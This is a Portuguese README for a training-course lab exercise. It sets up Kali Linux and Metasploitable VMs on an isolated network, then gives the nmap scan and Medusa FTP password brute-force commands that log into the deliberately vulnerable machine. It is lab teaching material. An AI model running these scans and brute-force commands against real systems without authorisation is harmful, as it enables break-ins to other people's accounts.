# simulando_taque_medusa_kalilinux
# Desafio de projeto Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux - Santander Cibersegurança

  Para iniciar o desafio é importante ter instalado em seu computador um programa de maquina vitual e os arquivos .iso do Kali Linux e do Metasploitable. Neste projeto, será utilizado o VitualBox para acessar os sistemas operacionais [Kali Linux](https://www.kali.org/get-kali/#kali-platforms) (invasor) e [Metasploitable](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/) (invadido), e assim iremos simular um ataque ao computador com o objetivo de ter acesso a usuarios e senhas.
  
<br> <br>

<img width="70" height="98" alt="Oracle VirtualBox" src="https://github.com/user-attachments/assets/e7791337-8508-4066-b0a5-5ca9223938b3" />

Descrição da imagem: VitualBox 

<br>

<img width="1365" height="721" alt="Kali e Meta no VB" src="https://github.com/user-attachments/assets/c0170236-6d51-4163-b469-a3269f475493" />
Descrição da imagem: Dentro do VitualBox é criado duas máquinas virtuais: Kali Linux e Metasploide

<br> <br> <br>

### _Preparando o ambiente_

 É necessário, primeiro, fazer uma configuração na rede das duas máquinas (Kali Linux e Metasploitable):
 - Clique uma vez na máquina que deseja conficurar;
 - Vá em Configuações;
 - Irá abrir o painei de configurações da máquina selecionada e é só clicar em Rede;
 - Na função _Conectado a:_ selecione _Placa de rede exclusiva de hospedeiro (host-only)_;
 - Clique em OK

 **OBS**: É necessário fazer esse processo nas duas máquinas!

 _Por que fazer essa configuração?_ <br>
 Para que as duas máquinas possam se comunicar diretamente, como se tivessem em uma rede local privada. 
 <br> <br>

 <img width="546" height="294" alt="Configuracao1" src="https://github.com/user-attachments/assets/2fd02666-f676-4376-943c-702b8f851a67" />
 
 <br> <br>

 <img width="1100" height="577" alt="Configuracao2" src="https://github.com/user-attachments/assets/15de51bb-7667-4a20-9a41-946ad444261e" />

<br> <br>


  Outra configuração importante para realizar no Metasploitable é criar uma Snapshot:
  - Na máquina do Metasploitable, clique em Máquina;
  - Clique em Criar Snapshot;
  - Em Nome do Snapshot pode acrescentar o nome desejado (lembrando que o nome tem que ser tudo minúsculo, sem espaço ou caractere especiais e acentos);
  - Clicar em OK

 _Por que fazer essa configuração?_ <br>
 Se por caso, durante o processo, ocorre algum dano na máquina virtual, o Snapshort voltará as configurações originais.

Podemos já iniciar ambas as máquinas. Esse processo pode demorar um pouco.

<br> <br> <br>

 ### _Iniciar as máquinas_

 #### Kali
 Tem um login e senha padrão: <br>
 Login: kali <br>
 Senha: kali <br> <br>
Após isso podemos acessar o terminal do Kali. <br>

<img width="1365" height="662" alt="terminal kali" src="https://github.com/user-attachments/assets/5f7bf093-fbdb-4fe4-a54d-f35307564f37" />
<br> <br>

 #### Metasploitable
 No terminal vai solicitar login e senha, o padrão é: <br>
 Login:msfadmin <br>
 Senha: msfadmin <br> <br>
Após vamos conseguir o IP da máquina virtual, com o seguinte comando: <br>

<img width="718" height="482" alt="comando ip" src="https://github.com/user-attachments/assets/12672b2a-9766-4291-9434-22c76f80461f" /> <br>
<img width="721" height="482" alt="ip" src="https://github.com/user-attachments/assets/d08ba6bc-0540-4dfa-a1f6-33f8cacf47dd" /> <br>

OBS: Para cada máquina terá um IP diferente!

 ### _Hora de Hackear_

 Usando o termina do Kali Linux, vamos alcancar nossa máquina vulnerave (Metasploitable) com o comando: <br>
_Lembrando:_ cada máquina tem seu IP. Então, nos comandos coloque o IP da sua máquina do Metasploide <br>
```
ping -c 3 192.168.56.103
```
Após a conexão, vamos verificar se ele está exposto e vulnerável. Faremos isso por usar a enumeração (descobrir quais serviços estão disponíveis):
```
nmap -sV -p 21,22,80, 445,139 192.168.56.103
```
 A partir deste comando, conseguimos ver as portas que estão abertas. Para verificar se o serviço está realmente ativo, vamos tentar conectar diretamente com ele com o comando:
```
ftp 192.168.56.103
```
<br>
<img width="718" height="482" alt="comando ip" src="https://github.com/user-attachments/assets/70a3ce6c-1a87-470a-9387-796f5c920934" />
<br> <br>
 Aqui vemos que está conectando, que o serviço está aberto, porém não sabemos qual o login e a senha. Teremos que usar a ferramenta Medusa. Primeiro precisamos criar duas lista dos possíveis nomes de usuários e senhas. Fazemos isso com os seguintes comandos: <br> <br>

```
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

<br>

```
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```

<br>
 Agora vamos usar a ferramenta Medusa que irá fazer uma serie de combinações até achar uma que tenha sucesso, ou seja, ela vai testar varias combinações de nomes de usuários e senhas, até que uma seja valida. A que for valida teremos uma mensagem de sucesso. E podemos inclusive testar para ver se vai ou não ser aceito o login e a senha. Para isso precisamos usar o seguinte comando:
<br> 

```
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
```

<br> <br>
<img width="815" height="600" alt="sucesso" src="https://github.com/user-attachments/assets/f213d875-f224-4496-80da-b0f0d5340d3e" />
<br> <br>
 
  Podemos identificar o nome de usuário e senha que passaram nos teste que a Medusa fez:
  
<br> <br>
<img width="718" height="84" alt="user e senha" src="https://github.com/user-attachments/assets/2ca80392-56e5-4d58-ada4-ff0a524fed4f" />
<br> <br>

 Podemos agora fazer o teste, digite novamente o comando:
```
ftp 192.168.56.103
```
<br><br>
 Digite o nome de usuário e senha dados por Medusa e veja se deu certo.

<br> <br>
<img width="330" height="195" alt="teste" src="https://github.com/user-attachments/assets/737488b0-f623-4dbf-85f6-a8349f893c65" />
<br> <br>
 Vemos que apareceu uma mensagem de sucesso! Resumindo, conseguimos acesso a nossa máquina vulnerável. <br> <br>
